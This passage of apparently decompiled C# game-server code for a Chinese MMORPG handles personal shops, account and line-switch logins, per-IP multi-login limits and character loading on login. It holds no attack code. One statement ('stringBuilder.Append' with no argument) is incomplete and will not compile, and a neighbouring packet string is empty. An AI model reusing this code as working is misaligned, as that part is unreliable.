						byte[] array5 = Converter.hexStringToByte("AA5510000000CD0002000404000000000000000055AA");
						Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array5, 4, 2);
						if (players.Client != null)
						{
							players.Client.Send(array5, array5.Length);
						}
						byte[] array6 = Converter.hexStringToByte("AA551A000000CA000C000100000000000000FFFFFFFF000000000000000055AA");
						Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array6, 14, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array6, 4, 2);
						if (players.Client != null)
						{
							players.Client.Send(array6, array6.Length);
						}
						players.发送当前范围广播数据(array6, array6.Length);
						进店中 = false;
						进店中ID = 0;
						打开仓库中 = false;
					}
					else
					{
						players.保存人物数据存储过程();
					}
					保存人物数据存储过程();
					break;
				}
				case 3:
					出店(num2);
					break;
				}
			}
			catch (Exception ex)
			{
				出店(进店中ID);
				MainForm.WriteLine(1, "个人商店进店出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 关店()
		{
			int num = 0;
			try
			{
				byte[] array = Converter.hexStringToByte("AA5510000000CD0002000404000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				num = 1;
				if (个人商店.进入人 != null)
				{
					num = 2;
					byte[] array2 = Converter.hexStringToByte("AA5514000000CF000600030319000000000000000000000055AA");
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 12, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(个人商店.进入人.人物全服ID), 0, array2, 4, 2);
					个人商店.进入人.进店中 = false;
					num = 3;
					个人商店.进入人.打开仓库中 = false;
					num = 4;
					个人商店.进入人.进店中ID = 0;
					num = 5;
					if (个人商店.进入人.Client != null)
					{
						个人商店.进入人.Client.Send(array2, array2.Length);
					}
					num = 6;
				}
				打开仓库中 = false;
				if (个人商店 != null)
				{
					个人商店.个人商店是否开启 = false;
					num = 7;
					个人商店.商店物品列表.Clear();
					num = 8;
					个人商店.Dispose();
					num = 9;
					个人商店.进入人 = null;
					个人商店 = null;
				}
				num = 10;
				byte[] array3 = Converter.hexStringToByte("AA551A000000CA000C000100000000000000FFFFFFFF000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 14, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array3, array3.Length);
				}
				num = 11;
				发送当前范围广播数据(array3, array3.Length);
				合成系统解锁();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "个人商店关店出错![" + base.Userid + "]-[" + base.UserName + "]" + num + "|" + ex.Message);
			}
		}

		public void 出店(int 人物ID)
		{
			byte[] array = Converter.hexStringToByte("AA5514000000CF000600030319000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(人物ID), 0, array, 12, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			进店中 = false;
			打开仓库中 = false;
			进店中ID = 0;
			Players players = 得到人物数据(人物ID);
			if (players != null)
			{
				players.个人商店.个人商店是否使用中 = false;
				players.个人商店.进入人 = null;
				byte[] array2 = Converter.hexStringToByte("AA5518000000CF000A0003030000000001000000000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array2, 12, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array2, 4, 2);
				if (players.Client != null)
				{
					players.Client.Send(array2, array2.Length);
				}
			}
		}

		public void 连接登陆(byte[] data, int length)
		{
			try
			{
				PacketReader packetReader = new PacketReader(data, length, fixedSize: false);
				packetReader.Seek(10, SeekOrigin.Begin);
				string text = packetReader.ReadString(30).Trim();
				if (text.Length > 16)
				{
					if (base.Client != null)
					{
						kickidlog("连接登陆()1");
						base.Client.Dispose();
					}
					return;
				}
				if (base.Userid.Length != 0)
				{
					封号(720, base.Userid, "非法人物名");
					MainForm.WriteLine(99, "非法修改封包封号_连接登陆[" + base.Userid + "][" + base.UserName + "] 人物全服ID=[" + base.人物全服ID + "] [" + base.Client.ToString() + "]");
					return;
				}
				Players players = World.检查玩家(text);
				if (players != null)
				{
					if (players.Client.假人)
					{
						World.假人数量--;
						if (World.假人数量 < 0)
						{
							World.假人数量 = 0;
						}
						World.CloudAfkCount--;
						if (World.CloudAfkCount < 0)
						{
							World.CloudAfkCount = 0;
						}
						players.Client.DisposedOffline();
					}
					if (players.Client.挂机)
					{
						World.OfflineCount--;
						if (World.OfflineCount < 0)
						{
							World.OfflineCount = 0;
						}
						players.Client.DisposedOffline();
					}
					else
					{
						players.kickidlog("连接登陆()2");
						players.OpClient(0);
						players.Client.Dispose();
					}
					kickidlog("连接登陆()3");
					base.Client.Dispose();
					return;
				}
				packetReader.Seek(78, SeekOrigin.Begin);
				base.UserNip = base.Client.ToString();
				base.Client.绑定帐号 = base.Client.ToString();
				if (检测多开限制(base.Client.绑定帐号))
				{
					MainForm.WriteLine(1, "IP[" + base.Client.ToString() + "]达到在线多开数:[" + World.在线多开数量 + "]踢出");
					base.Client.Dispose();
				}
				base.Userid = text;
				World.conn.发送("用户登陆|" + text + "|" + base.Client.ToString() + "|" + World.ServerID + "|" + base.人物全服ID + "|" + base.Client.绑定帐号 + "|0|NULL");
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "连接登陆出错[" + base.人物全服ID + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public bool 检测多开限制(string ipaddr)
		{
			try
			{
				int num = 0;
				World.记录多开数量 = 0;
				if (World.信任连接IP != "")
				{
					string[] array = World.信任连接IP.Split(';');
					for (int i = 0; i < array.Length; i++)
					{
						if (array[i] == base.Client.ToString())
						{
							return false;
						}
					}
				}
				foreach (Players value in World.AllConnectedPlayers.Values)
				{
					if (value.Client.ToString() == ipaddr && !value.Client.挂机)
					{
						num++;
						World.记录多开数量++;
					}
				}
				if (num >= World.在线多开数量)
				{
					return true;
				}
			}
			catch
			{
				return false;
			}
			return false;
		}

		public static void SetUserId(string id, string ip)
		{
			RxjhClass.更新登陆IP(id, ip);
		}

		public void 连接登陆2(string id, string aa, string 原服务器IP, string 原端口, string 银币IP, string 银币端口, string 原服务器序号, string 原服务器ID)
		{
			int num = 0;
			try
			{
				base.Client.在线 = true;
				if (aa == "在线" || aa == null)
				{
					foreach (NetState value in World.ConnectionList.Values)
					{
						if (base.Client != null && value != base.Client && value.Player.Userid == id)
						{
							value.Dispose();
							break;
						}
					}
					if (base.Client != null)
					{
						base.Client.Dispose();
					}
					return;
				}
				foreach (NetState value2 in World.ConnectionList.Values)
				{
					if (base.Client != null && value2 != base.Client && value2.Player.Userid == id)
					{
						value2.Dispose();
						if (base.Client != null)
						{
							base.Client.在线 = true;
						}
						if (base.Client != null)
						{
							base.Client.Dispose();
						}
						return;
					}
				}
				num = 1;
				base.Client.在线 = true;
				base.Client.登陆 = true;
				DataTable dBToDataTable = DBA.GetDBToDataTable("select ID, FLD_PASSWORD, FLD_SEX, FLD_RXPIONT, FLD_RXPIONTX, FLD_CJCS, FLD_MONEY, FLD_PAY, FLD_INCOME, FLD_LOCK, FLD_VIP, FLD_VIPTIM, FLD_TRANSFER_TIMES, FLD_MACHINEID, FLD_COIN, FLD_SAFEWORD, FLD_LASTLOGINIP, FLD_REGIP, FLD_SPREADERID, FLD_ZJF, FLD_SPREADER_LEVEL,FLD_QCVIP,FLD_QCVIPTIM, 是否假人,FLD_YY,FLD_QDCS from [TBL_ACCOUNT] where FLD_ID=@Userid", new SqlParameter[1] { SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, id) }, "rxjhaccount");
				num = 2;
				base.FLD_推广ID = (int)dBToDataTable.Rows[0]["ID"];
				base.Password = dBToDataTable.Rows[0]["FLD_PASSWORD"].ToString();
				base.FLD_RXPIONT = (int)dBToDataTable.Rows[0]["FLD_RXPIONT"];
				base.FLD_RXPIONTX = (int)dBToDataTable.Rows[0]["FLD_RXPIONTX"];
				base.FLD_Coin = (int)dBToDataTable.Rows[0]["FLD_COIN"];
				base.FLD_QCVIP = int.Parse(dBToDataTable.Rows[0]["FLD_QCVIP"].ToString());
				base.FLD_CJCS = (int)dBToDataTable.Rows[0]["FLD_CJCS"];
				base.账号是否假人 = (int)dBToDataTable.Rows[0]["是否假人"];
				base.FLD_首充次数 = (int)dBToDataTable.Rows[0]["FLD_MONEY"];
				base.元宝充值 = (int)dBToDataTable.Rows[0]["FLD_PAY"];
				base.钻石充值 = (int)dBToDataTable.Rows[0]["FLD_INCOME"];
				base.账号锁定 = (int)dBToDataTable.Rows[0]["FLD_LOCK"];
				base.元宝消费 = (int)dBToDataTable.Rows[0]["FLD_QDCS"];
				base.钻石消费 = (int)dBToDataTable.Rows[0]["FLD_YY"];
				base.FLD_VIP = int.Parse(dBToDataTable.Rows[0]["FLD_VIP"].ToString());
				base.FLD_VIPTIM = DateTime.Parse(dBToDataTable.Rows[0]["FLD_VIPTIM"].ToString());
				base.FLD_QCVIPTIM = DateTime.Parse(dBToDataTable.Rows[0]["FLD_QCVIPTIM"].ToString());
				base.FLD_QDVIPTIM = DateTime.Parse(dBToDataTable.Rows[0]["FLD_TRANSFER_TIMES"].ToString());
				base.FLD_MBVIPTIM = DateTime.Parse(dBToDataTable.Rows[0]["FLD_MACHINEID"].ToString());
				base.Player_Sex = int.Parse(dBToDataTable.Rows[0]["FLD_SEX"].ToString());
				base.lastloginip = dBToDataTable.Rows[0]["FLD_LASTLOGINIP"].ToString();
				base.zastcoginip = dBToDataTable.Rows[0]["FLD_REGIP"].ToString();
				游戏安全码 = dBToDataTable.Rows[0]["FLD_SAFEWORD"].ToString();
				base.FLD_SPREADERID = dBToDataTable.Rows[0]["FLD_SPREADERID"].ToString();
				base.FLD_ZJF = (int)dBToDataTable.Rows[0]["FLD_ZJF"];
				base.FLD_SPREADER_LEVEL = (int)dBToDataTable.Rows[0]["FLD_SPREADER_LEVEL"];
				if (World.vip线 != 1)
				{
					goto IL_05de;
				}
				if (base.FLD_VIP != 1)
				{
					if (base.Client != null)
					{
						base.Client.Dispose();
					}
					return;
				}
				if (base.FLD_VIP != 1 || !(DateTime.Now > base.FLD_VIPTIM))
				{
					goto IL_05de;
				}
				if (base.Client != null)
				{
					base.Client.Dispose();
				}
				goto end_IL_0003;
				IL_05de:
				base.原服务器序号 = int.Parse(原服务器序号);
				string text = "3 变量值" + 原服务器序号;
				base.原服务器IP = 原服务器IP;
				string text2 = "4 变量值" + 原服务器IP;
				base.原服务器端口 = int.Parse(原端口);
				string text3 = "5 变量值" + 原端口;
				base.原服务器ID = int.Parse(原服务器ID);
				base.银币广场服务器IP = 银币IP;
				string text4 = "7 变量值" + 银币IP;
				base.银币广场服务器端口 = int.Parse(银币端口);
				string text5 = "8 变量值" + 银币端口;
				num = 3;
				StringBuilder stringBuilder = new StringBuilder();
				if (World.是否加密2 == 1)
				{
					stringBuilder.Append("");
				}
				else
				{
					stringBuilder.Append
				}
				byte[] array = Converter.hexStringToByte(stringBuilder.ToString());
				Buffer.BlockCopy(BitConverter.GetBytes(51), 0, array, 22, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(World.ServerID - 1), 0, array, 26, 4);
				if (World.是否加密2 == 1)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(base.Client.Key2), 0, array, 30, 4);
				}
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(int.Parse(dBToDataTable.Rows[0]["FLD_SEX"].ToString())), 0, array, 14, 2);
				num = 5;
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				if (World.是否加密2 == 1)
				{
					base.Client.加密 = true;
				}
				MainForm.WriteLine(3, "连接登陆成功[" + base.人物全服ID + "]-[" + id.ToString() + "]");
				num = 6;
				dBToDataTable.Dispose();
				end_IL_0003:;
			}
			catch (Exception ex)
			{
				if (base.Client != null)
				{
					base.Client.Dispose();
				}
				MainForm.WriteLine(1, "连接登陆2()出错：" + num + ex);
			}
		}

		public void 换线账号登陆(string id, int 服务器ID, int 人物序号, int WorldID, string 绑定帐号, string 原服务器IP, string 原服务器端口, string 银币广场IP, string 银币广场端口, string 原服务器序号, string 原服务器ID, string 新服务器ID, string 封包登陆)
		{
			string str = "";
			try
			{
				base.Client.绑定帐号 = 绑定帐号;
				base.Client.版本验证 = true;
				if (World.允许挂机 == 1)
				{
					base.Client.挂机 = false;
				}
				base.Client.在线 = true;
				base.Client.登陆 = true;
				DataTable dataTable = DBA.GetDBToDataTable("select ID, FLD_PASSWORD, FLD_SEX, FLD_RXPIONT, FLD_RXPIONTX, FLD_CJCS, FLD_MONEY, FLD_PAY, FLD_INCOME, FLD_LOCK, FLD_VIP, FLD_VIPTIM, FLD_TRANSFER_TIMES, FLD_MACHINEID, FLD_COIN, FLD_SAFEWORD, FLD_ZT, FLD_LASTLOGINIP, FLD_REGIP, FLD_SPREADERID, FLD_ZJF, FLD_SPREADER_LEVEL, 是否假人 from [TBL_ACCOUNT] where FLD_ID=@Userid", new SqlParameter[1] { SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, id) }, "rxjhaccount");
				if (dataTable == null && base.Client != null)
				{
					kickidlog("换线账号登陆 出错 table1==null");
					base.Client.Dispose();
					return;
				}
				if (!(封包登陆 != "1"))
				{
					goto IL_00f3;
				}
				if (base.Client == null)
				{
					return;
				}
				OpClient(1);
				base.Client.Dispose();
				goto IL_00f3;
				IL_00f3:
				str = "1";
				if ((int)dataTable.Rows[0]["FLD_ZT"] <= 0)
				{
					goto IL_03ae;
				}
				dataTable.Dispose();
				dataTable = null;
				if (base.Client == null)
				{
					goto IL_03ae;
				}
				kickidlog("换线账号登陆 账号已停封");
				OpClient(1);
				base.Client.Dispose();
				goto end_IL_0007;
				IL_03a1:
				DataTable dBToDataTable;
				dBToDataTable.Dispose();
				goto end_IL_0007;
				IL_03ae:
				str = "2";
				base.原服务器序号 = int.Parse(原服务器序号);
				str = "3 变量值" + 原服务器序号;
				base.原服务器IP = 原服务器IP;
				try
				{
					base.原服务器端口 = int.Parse(原服务器端口);
				}
				catch (Exception)
				{
					base.原服务器端口 = World.GameServerPort;
				}
				try
				{
					base.原服务器ID = int.Parse(新服务器ID);
				}
				catch (Exception)
				{
					base.原服务器ID = World.ServerID;
				}
				str = "5 变量值" + 新服务器ID;
				base.银币广场服务器IP = 银币广场IP;
				try
				{
					base.银币广场服务器端口 = int.Parse(银币广场端口);
				}
				catch (Exception)
				{
					base.银币广场服务器端口 = World.GameServerPort;
				}
				str = "6 变量值" + 银币广场端口;
				base.Userid = id;
				base.FLD_推广ID = (int)dataTable.Rows[0]["ID"];
				base.Password = dataTable.Rows[0]["FLD_PASSWORD"].ToString();
				base.FLD_RXPIONT = (int)dataTable.Rows[0]["FLD_RXPIONT"];
				base.FLD_RXPIONTX = (int)dataTable.Rows[0]["FLD_RXPIONTX"];
				base.FLD_Coin = (int)dataTable.Rows[0]["FLD_COIN"];
				base.FLD_CJCS = (int)dataTable.Rows[0]["FLD_CJCS"];
				base.账号是否假人 = (int)dataTable.Rows[0]["是否假人"];
				base.FLD_首充次数 = (int)dataTable.Rows[0]["FLD_MONEY"];
				base.元宝充值 = (int)dataTable.Rows[0]["FLD_PAY"];
				base.钻石充值 = (int)dataTable.Rows[0]["FLD_INCOME"];
				base.账号锁定 = (int)dataTable.Rows[0]["FLD_LOCK"];
				base.FLD_VIP = int.Parse(dataTable.Rows[0]["FLD_VIP"].ToString());
				base.FLD_VIPTIM = DateTime.Parse(dataTable.Rows[0]["FLD_VIPTIM"].ToString());
				base.FLD_QDVIPTIM = DateTime.Parse(dataTable.Rows[0]["FLD_TRANSFER_TIMES"].ToString());
				base.FLD_MBVIPTIM = DateTime.Parse(dataTable.Rows[0]["FLD_MACHINEID"].ToString());
				base.Player_Sex = int.Parse(dataTable.Rows[0]["FLD_SEX"].ToString());
				base.lastloginip = dataTable.Rows[0]["FLD_LASTLOGINIP"].ToString();
				base.zastcoginip = dataTable.Rows[0]["FLD_REGIP"].ToString();
				游戏安全码 = dataTable.Rows[0]["FLD_SAFEWORD"].ToString();
				base.FLD_SPREADERID = dataTable.Rows[0]["FLD_SPREADERID"].ToString();
				base.FLD_ZJF = (int)dataTable.Rows[0]["FLD_ZJF"];
				base.FLD_SPREADER_LEVEL = (int)dataTable.Rows[0]["FLD_SPREADER_LEVEL"];
				dataTable.Dispose();
				if (World.vip线 != 1)
				{
					goto IL_016a;
				}
				if (base.FLD_VIP != 1)
				{
					if (base.Client != null)
					{
						kickidlog("非VIP登录VIP线路");
						base.Client.Dispose();
					}
					return;
				}
				if (base.FLD_VIP != 1 || !(DateTime.Now > base.FLD_VIPTIM))
				{
					goto IL_016a;
				}
				if (base.Client != null)
				{
					kickidlog("VIP过期");
					OpClient(1);
					base.Client.Dispose();
				}
				goto end_IL_0007;
				IL_016a:
				str = "7";
				MainForm.WriteLine(3, "换线连接登陆成功[" + base.人物全服ID + "]-[" + id.ToString() + "]");
				str = "8";
				dBToDataTable = DBA.GetDBToDataTable("select FLD_NAME, FLD_X, FLD_Y, FLD_MENOW from [TBL_XWWL_Char] where FLD_ID=@Userid and FLD_INDEX=@index", new SqlParameter[2]
				{
					SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, id),
					SqlDBA.MakeInParam("@index", SqlDbType.Int, 0, 人物序号)
				});
				if (dBToDataTable != null)
				{
					if (dBToDataTable.Rows.Count == 0 && base.Client != null)
					{
						MainForm.WriteLine(1, "换线获取人物出错3，[" + base.Userid + "][" + base.UserName + "]");
						dBToDataTable.Dispose();
						base.Client.Dispose();
					}
					else
					{
						string name = dBToDataTable.Rows[0]["FLD_NAME"].ToString();
						float num = float.Parse(dBToDataTable.Rows[0]["FLD_X"].ToString());
						float num2 = float.Parse(dBToDataTable.Rows[0]["FLD_Y"].ToString());
						int map = (int)dBToDataTable.Rows[0]["FLD_MENOW"];
						dBToDataTable.Dispose();
						new Thread(new ThreadWithState(this, name, num.ToString(), num2.ToString(), map).ThreadProc2).Start();
					}
					goto IL_03a1;
				}
				if (base.Client == null)
				{
					return;
				}
				kickidlog("获取人物出错4");
				MainForm.WriteLine(1, "获取人物出错4，[" + base.Userid + "][" + base.UserName + "]");
				OpClient(1);
				base.Client.Dispose();
				goto IL_03a1;
				end_IL_0007:;
			}
			catch (Exception ex4)
			{
				if (base.Client != null)
				{
					kickidlog("换线账号登陆出错");
					base.Client.Dispose();
				}
				MainForm.WriteLine(1, "换线账号登陆()出错 代码:" + str + " 信息2:" + ex4);
			}
		}

		public void 换线确认()
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA551B00AE04D60015000100000000B1040000000050C1000070410000AAC255AA");
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_地图), 0, array, 15, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 19, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Z), 0, array, 23, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 27, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "换线验证[" + base.人物全服ID + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 复查用户登陆()
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				foreach (NetState value3 in World.ConnectionList.Values)
				{
					string value = "NULL";
					int value4 = 0;
					if (value3.挂机)
					{
						value4 = 1;
					}
					int value5 = 0;
					string value6 = string.Empty;
					string value7 = string.Empty;
					int value8 = 0;
					string value9 = string.Empty;
					string value10 = string.Empty;
					int value11 = 0;
					int value2 = 0;
					Players players = World.检查玩家世界ID(value3.WorldId);
					if (players != null)
					{
						value = players.UserName;
						value5 = players.原服务器序号;
						value6 = players.原服务器IP;
						value7 = players.原服务器端口.ToString();
						value8 = players.原服务器ID;
						value9 = players.银币广场服务器IP;
						value10 = players.银币广场服务器端口.ToString();
						value2 = players.Player_Job;
						if (players.公有药品.TryGetValue(1008000027, out var _))
						{
							value11 = 1;
						}
					}
					stringBuilder.Append(value3.Player.Userid);
					stringBuilder.Append("-");
					stringBuilder.Append(value3.ToString());
					stringBuilder.Append("-");
					stringBuilder.Append(value3.绑定帐号);
					stringBuilder.Append("-");
					stringBuilder.Append(value4);
					stringBuilder.Append("-");
					stringBuilder.Append(value);
					stringBuilder.Append("-");
					stringBuilder.Append(value5);
					stringBuilder.Append("-");
					stringBuilder.Append(value6);
					stringBuilder.Append("-");
					stringBuilder.Append(value7);
					stringBuilder.Append("-");
					stringBuilder.Append(value8);
					stringBuilder.Append("-");
					stringBuilder.Append(value9);
					stringBuilder.Append("-");
					stringBuilder.Append(value10);
					stringBuilder.Append("-");
					stringBuilder.Append(value3.WorldId);
					stringBuilder.Append("-");
					stringBuilder.Append(value11);
					stringBuilder.Append("-");
					stringBuilder.Append(value2);
					stringBuilder.Append(", ");
				}
				if (stringBuilder.Length > 0)
				{
					stringBuilder.Remove(stringBuilder.Length - 1, 1);
				}
				World.conn.发送("复查用户登陆|" + stringBuilder);
				if (World.AutGC != 0)
				{
					GC.Collect();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "复查用户登陆 错误" + ex.Message);
			}
		}

		public void 换线人物登陆(string UName, string x, string y, int map)
		{
			int num = 0;
			try
			{
				if (人物是否登陆)
				{
					复查用户登陆();
					kickidlog("已登陆人物换线登陆");
					World.conn.发送("踢出玩家ID|" + World.ServerID + "|" + base.Userid);
					if (base.Client != null)
					{
						OpClient(1);
						base.Client.Dispose();
					}
					return;
				}
				人物是否登陆 = true;
				num = 1;
				base.UserName = UName;
				if (base.UserName.Length == 0)
				{
					kickidlog("换线人物登陆 人物名长度0");
					OpClient(1);
					base.Client.Dispose();
					return;
				}
				if (Encoding.Default.GetBytes(base.UserName).Length > 14)
				{
					string text = "换线人物登陆 人物名太长[" + base.Userid + "][" + base.UserName + "] [" + base.Client.ToString() + "]";
					kickidlog(text);
					MainForm.WriteLine(99, text);
					OpClient(1);
					base.Client.Dispose();
					return;
				}
				num = 11;
				while (World.SqlPool.Count > 0)
				{
					Thread.Sleep(5);
				}
				读出人物数据();
				Thread.Sleep(20);
				num = 2;
				换线确认();
				Thread.Sleep(20);
				门派荣誉称号();
				Thread.Sleep(20);
				获得花榜称号属性();
				获得玫瑰称号属性();
				武林前十称号属性();
				获得排位榜称号属性();
				Thread.Sleep(20);
				服务器时间();
				if (称号积分 >= int.Parse(World.至高无上称号奖励[0]))
				{
					base.称号追加攻击 = int.Parse(World.至高无上称号奖励[1]);
					base.称号追加防御 = int.Parse(World.至高无上称号奖励[2]);
					base.称号追加HP = int.Parse(World.至高无上称号奖励[3]);
					base.称号追加战斗力 = int.Parse(World.至高无上称号奖励[4]);
					base.FLD_荣誉ID = 601;
					获取称号类型(1008001567, 1);
				}
				else if (称号积分 >= int.Parse(World.举世无双称号奖励[0]))
				{
					base.称号追加攻击 = int.Parse(World.举世无双称号奖励[1]);
					base.称号追加防御 = int.Parse(World.举世无双称号奖励[2]);
					base.称号追加HP = int.Parse(World.举世无双称号奖励[3]);
					base.称号追加战斗力 = int.Parse(World.举世无双称号奖励[4]);
					base.FLD_荣誉ID = 602;
					获取称号类型(1008001568, 1);
				}
				else if (称号积分 >= int.Parse(World.雄霸天下称号奖励[0]))
				{
					base.称号追加攻击 = int.Parse(World.雄霸天下称号奖励[1]);
					base.称号追加防御 = int.Parse(World.雄霸天下称号奖励[2]);
					base.称号追加HP = int.Parse(World.雄霸天下称号奖励[3]);
					base.称号追加战斗力 = int.Parse(World.雄霸天下称号奖励[4]);
					base.FLD_荣誉ID = 603;
					获取称号类型(1008001569, 1);
				}
				else if (称号积分 >= int.Parse(World.孤胆英雄称号奖励[0]))
				{
					base.称号追加攻击 = int.Parse(World.孤胆英雄称号奖励[1]);
					base.称号追加防御 = int.Parse(World.孤胆英雄称号奖励[2]);
					base.称号追加HP = int.Parse(World.孤胆英雄称号奖励[3]);
					base.称号追加战斗力 = int.Parse(World.孤胆英雄称号奖励[4]);
					base.FLD_荣誉ID = 604;
					获取称号类型(1008001570, 1);
				}
				else if (称号积分 >= int.Parse(World.英雄豪杰称号奖励[0]))
				{
					base.称号追加攻击 = int.Parse(World.英雄豪杰称号奖励[1]);
					base.称号追加防御 = int.Parse(World.英雄豪杰称号奖励[2]);
					base.称号追加HP = int.Parse(World.英雄豪杰称号奖励[3]);
					base.称号追加战斗力 = int.Parse(World.英雄豪杰称号奖励[4]);
					base.FLD_荣誉ID = 605;
					获取称号类型(1008001571, 1);
				}
				检测走跑();
				num = 12;
				初始化气功();
				num = 13;
				初始化装备篮包裹();
				num = 130;
				初始化凝神珠包裹();
				num = 1300;
				if (是否携带披风行囊)
				{
					初始化披风行囊();
				}
				num = 64;
				初始化行囊包裹();
				num = 65;
				初始化杂货行囊包裹();
				num = 14;
				发送任务物品列表();
				num = 15;
				初始化已装备物品();
				num = 16;
				num = 17;
				Set个人药品();
				num = 18;
				更新金钱和负重();
				num = 19;
				灵兽数();
				num = 20;
				num = 23;
				set公有物品();
				Thread.Sleep(20);
				set时间物品();
				Thread.Sleep(20);
				set称号物品();
				Thread.Sleep(20);
				set特殊物品();
				num = 24;
				Thread.Sleep(20);
				Set追加状态物品();
				num = 25;
				计算人物装备数据();
				num = 26;
				num = 28;
				更新人物任务2(0);
				num = 29;
				发送已完成任务数据();
				num = 290;
				发送土灵符数据();
				if (Logoin())
				{
					num = 31;
					更新制作系统();
					num = 32;
					num = 33;
					获取复查范围Npc();
					num = 34;
					获取复查范围玩家();
					num = 35;
					获取复查范围地面物品();
					num = 36;
					if (base.帮派Id != 0)
					{
						查帮派();
					}
					num = 37;
					初始化职业技能();
					num = 47;
					if (师傅数据.TID != -1)
					{
						徒弟更新师徒系统();
					}
					else
					{
						for (int i = 0; i < 3; i++)
						{
							if (徒弟数据[i].TID != -1)
							{
								师傅更新师徒系统(i);
							}
							计算师徒属性(i);
						}
					}
					更新荣誉();
					结婚BUFF();
					更新移动速度();
					其他();
					num = 56;
					加载门战数据();
					if (World.是否开启上线BUFF == 1 && !追加状态列表.ContainsKey(1008000387))
					{
						追加状态类 追加状态类2 = new 追加状态类(this, 864000000.0, 1008000387.0, 1.0);
						追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
						状态效果(BitConverter.GetBytes(1008000387), 1, 864000000);
						base.FLD_人物_追加_经验百分比 += 0.5;
						更新HP_MP_SP();
						更新武功和状态();
						更新气功();
					}
					foreach (GuildWarData value in World.guildWarDataList.Values)
					{
						if (value.LeaderName == base.UserName && DateTime.Now < value.RewardTime)
						{
							if (!追加状态列表.ContainsKey(900000047))
							{
								long ticks = value.RewardTime.ToUniversalTime().Ticks;
								long ticks2 = DateTime.Now.ToUniversalTime().Ticks;
								long num2 = (ticks - ticks2) / 10000;
								追加状态类 追加状态类3 = new 追加状态类(this, num2, 900000047.0, 1.0);
								追加状态列表.Add(追加状态类3.FLD_PID, 追加状态类3);
								状态效果(BitConverter.GetBytes(900000047), 1, (int)num2);
								base.FLD_人物_追加_攻击 += 100;
								base.FLD_人物_追加_防御 += 100;
								base.人物追加最大_HP += 500;
								base.FLD_人物_追加_气功++;
								更新HP_MP_SP();
								更新武功和状态();
								更新气功();
							}
							系统提示("你的门战门主奖励到期时间是:" + value.RewardTime.ToString("yyyy年MM月dd日hh时mm分"), 9, "系统提示");
						}
						else if (value.GuildName == base.帮派名字 && DateTime.Now < value.RewardTime)
						{
							if (!追加状态列表.ContainsKey(900000046))
							{
								long ticks3 = value.RewardTime.ToUniversalTime().Ticks;
								long ticks4 = DateTime.Now.ToUniversalTime().Ticks;
								long num3 = (ticks3 - ticks4) / 10000;
								追加状态类 追加状态类4 = new 追加状态类(this, num3, 900000046.0, 1.0);
								追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
								状态效果(BitConverter.GetBytes(900000046), 1, (int)num3);
								base.FLD_人物_追加_攻击 += 60;
								base.FLD_人物_追加_防御 += 60;
								base.人物追加最大_HP += 300;
								更新HP_MP_SP();
								更新武功和状态();
								更新气功();
							}
							系统提示("你的门战奖励到期时间是:" + value.RewardTime.ToString("yyyy年MM月dd日hh时mm分"), 9, "系统提示");
						}
						else if (value.GuildName != base.帮派名字 && 追加状态列表.ContainsKey(900000047))
						{
							追加状态列表[900000047].时间结束事件();
						}
						else if (value.GuildName != base.帮派名字 && 追加状态列表.ContainsKey(900000046))
						{
							追加状态列表[900000046].时间结束事件();
						}
					}
					num = 51;
					更新人物数据(this);
					num = 52;
					更新武功和状态();
					num = 53;
					更新HP_MP_SP();
					num = 54;
					新手上线();
					num = 71;
					更新经验和历练();
					num = 73;
					检测婚姻状态();
					num = 74;
					更新武功冷却();
					num = 75;
					if (base.Player_Job < 1 || base.Player_Job > 13)
					{
						封号(720, base.Userid, "非法人物登陆");
					}
					if (base.人物_HP <= 0)
					{
						移动(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
						base.人物_HP = base.人物最大_HP;
						更新HP_MP_SP();
						base.Player死亡 = false;
					}
					num = 24;
					switch (map)
					{
					case 101:
						关闭商店(6);
						break;
					case 801:
						关闭商店(73);
						break;
					case 41001:
